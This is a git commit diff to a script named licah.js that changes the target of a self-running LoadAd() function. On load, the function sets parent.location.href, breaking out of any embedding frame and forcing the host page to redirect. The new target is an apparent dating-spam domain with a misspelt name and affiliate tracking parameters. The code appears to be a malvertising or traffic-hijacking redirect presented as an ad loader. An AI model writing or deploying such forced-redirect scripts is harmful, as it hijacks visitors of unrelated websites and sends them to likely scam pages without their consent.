241f2a4177dce63ca0d9d5a26df6f66a2638108d
style-font <121629902+style-font@users.noreply.github.com>
2025-04-24 10:18:09 +0700

    Update licah.js

--- licah.js
+++ licah.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://licahtraf.app.link/UwQLx1EVKzb"; } LoadAd();
+function LoadAd() { parent.location.href="https://jdbqg.unfamllliardates.com/?utm_source=da57dc555e50572d&j1=1&s1=65949&s2=1890025&s3=LTOK"; } LoadAd();
